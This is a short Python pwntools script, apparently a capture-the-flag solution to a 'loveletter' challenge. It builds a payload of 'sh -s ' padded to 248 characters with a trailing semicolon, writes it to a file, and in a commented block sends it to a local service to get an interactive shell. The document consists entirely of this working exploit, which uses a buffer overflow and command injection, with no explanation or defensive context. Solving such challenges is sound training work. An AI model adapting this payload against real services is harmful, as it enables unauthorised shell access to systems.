#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

name = "sh -s " + ";".rjust(248, 'a')
with open("payload", "wb") as f:
    f.write(name)

'''
loveletter@ubuntu:/tmp/m4x_loveletter$ cat solve.py
from pwn import *
context.log_level = "debug"

io = remote("localhost", 9031)
name = "sh -s " + ";".rjust(248, 'a')
# with open("payload", "wb") as f:
#    f.write(name)

io.sendline(name)

io.interactive()
'''
